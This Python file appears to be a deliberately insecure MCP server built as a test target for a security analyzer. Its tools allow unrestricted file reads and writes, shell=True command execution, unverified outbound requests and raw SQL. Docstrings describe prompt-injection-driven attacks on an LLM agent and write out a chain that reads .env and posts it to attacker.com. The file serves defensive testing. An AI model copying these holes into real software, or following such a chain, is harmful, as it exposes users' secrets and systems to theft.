"""
Vulnerable MCP (Model Context Protocol) Server - Test Target

This file intentionally exposes the security weaknesses your MCPSecurityAnalyzer
is designed to detect. It is a fabricated server, NOT for production use.

Designed to trigger:
  - MCP server-level audit issues (TLS, auth)
  - MCP tool-level audit issues (high-risk tools without approval/rate limits)
  - MCP file-access audit issues (unrestricted filesystem)
  - MCP tool-chaining risk (filesystem_read + network_request)
"""

import os
import subprocess
import requests
from typing import Dict, Any, List


# ---------------------------------------------------------------------------
# Server Configuration (deliberately insecure)
# ---------------------------------------------------------------------------

MCP_SERVER_CONFIG = {
    "server_name": "vulnerable-dev-mcp",
    "server_url": "http://192.168.1.42:7777",   # HTTP, not HTTPS  -> insecure_transport
    "tls_enabled": False,                        # -> missing_tls
    "certificate_validation": False,             # -> missing_cert_validation
    "authentication_method": None,               # -> missing_authentication
    "allowed_agents": None,                      # -> missing_agent_allowlist
}


# ---------------------------------------------------------------------------
# Tool definitions (deliberately over-permissioned)
# ---------------------------------------------------------------------------

TOOLS: List[Dict[str, Any]] = [
    {
        "tool_name": "filesystem_read",
        "tool_type": "filesystem",
        "risk_level": "high",
        "permissions": ["read_any_path"],
        "allowed_paths": None,        # -> unrestricted_filesystem_access
        "blocked_paths": None,        # -> sensitive_files_not_blocked
        "requires_approval": False,   # -> high_risk_tool_no_approval
        "authentication_required": False,
        "rate_limit": None,           # -> missing_rate_limit
    },
    {
        "tool_name": "filesystem_write",
        "tool_type": "filesystem",
        "risk_level": "critical",
        "permissions": ["write_any_path"],
        "allowed_paths": None,
        "blocked_paths": None,
        "requires_approval": False,
        "authentication_required": False,
        "rate_limit": None,
    },
    {
        "tool_name": "shell_command",
        "tool_type": "code_execution",
        "risk_level": "critical",
        "permissions": ["execute_shell"],
        "requires_approval": False,   # arbitrary shell with no human gate
        "authentication_required": False,
        "rate_limit": None,
    },
    {
        "tool_name": "network_request",
        "tool_type": "network",
        "risk_level": "high",
        "permissions": ["http_get", "http_post"],
        "requires_approval": False,
        "authentication_required": False,
        "rate_limit": None,
    },
    {
        "tool_name": "database_query",
        "tool_type": "database",
        "risk_level": "high",
        "permissions": ["read_query", "write_query"],
        "requires_approval": False,
        "authentication_required": False,
        "rate_limit": None,
    },
]


# ---------------------------------------------------------------------------
# Tool implementations (vulnerable on purpose)
# ---------------------------------------------------------------------------

def filesystem_read(path: str) -> str:
    """
    VULNERABILITY: No path validation. Path traversal & sensitive file exposure.
    An LLM agent that receives a poisoned instruction can read any file the
    server process can access -- .env, ~/.ssh/id_rsa, /etc/shadow, etc.
    """
    with open(path, "r") as f:                    # CWE-22, CWE-200
        return f.read()


def filesystem_write(path: str, content: str) -> bool:
    """
    VULNERABILITY: Unrestricted writes. Combined with shell_command this allows
    deploying webshells or overwriting startup scripts.
    """
    with open(path, "w") as f:                    # CWE-73, CWE-732
        f.write(content)
    return True


def shell_command(cmd: str) -> str:
    """
    VULNERABILITY: Direct shell execution from tool arguments.
    Classic command injection sink for prompt-injection-driven exploitation.
    """
    result = subprocess.run(                      # CWE-78
        cmd,
        shell=True,                               # shell=True with user-controlled input
        capture_output=True,
        text=True,
    )
    return result.stdout + result.stderr


def network_request(url: str, method: str = "GET", body: Any = None) -> str:
    """
    VULNERABILITY: Server-side request forgery + data exfiltration.
    Combined with filesystem_read this is the classic MCP tool-chaining attack:
       read(.env) -> network_request("POST", attacker.com, body=<env contents>)
    """
    resp = requests.request(                      # CWE-918
        method=method,
        url=url,
        data=body,
        verify=False,                             # cert validation disabled
        timeout=30,
    )
    return resp.text


def database_query(sql: str) -> List[Dict[str, Any]]:
    """
    VULNERABILITY: Raw SQL passed through verbatim. An agent given an attacker-
    controlled query string can drop tables or exfiltrate the user database.
    """
    # Pretend DB call -- the issue is the contract, not the connector.
    return [{"_warning": "tool accepts raw SQL", "query": sql}]   # CWE-89


# ---------------------------------------------------------------------------
# MCP request handler (no auth, no allowlist, no logging of tool-chain context)
# ---------------------------------------------------------------------------

def handle_tool_call(agent_id: str, tool_name: str, params: Dict[str, Any]) -> Any:
    """
    VULNERABILITY: agent_id is trusted on the wire, not verified.
    No rate-limit, no per-agent allowlist, no audit trail across calls.
    """
    dispatch = {
        "filesystem_read": lambda p: filesystem_read(p["path"]),
        "filesystem_write": lambda p: filesystem_write(p["path"], p["content"]),
        "shell_command": lambda p: shell_command(p["cmd"]),
        "network_request": lambda p: network_request(p["url"], p.get("method", "GET"), p.get("body")),
        "database_query": lambda p: database_query(p["sql"]),
    }
    if tool_name not in dispatch:
        raise ValueError(f"unknown tool: {tool_name}")
    return dispatch[tool_name](params)


if __name__ == "__main__":
    # Smoke test -- do not run in production
    print("MCP_SERVER_CONFIG:", MCP_SERVER_CONFIG)
    print("REGISTERED TOOLS:", [t["tool_name"] for t in TOOLS])
